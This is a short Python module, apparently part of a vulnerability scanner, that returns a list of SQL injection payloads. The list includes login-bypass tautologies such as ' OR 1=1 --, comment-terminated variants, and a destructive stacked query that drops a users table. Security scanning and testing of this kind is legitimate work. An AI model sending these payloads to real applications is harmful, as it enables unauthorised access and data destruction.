# scanner/payloads.py

def get_sqli_payloads():
    return [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users; --",
        "' OR 'a'='a",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1 LIMIT 1--",
        "' OR EXISTS(SELECT * FROM users)--"
    ]
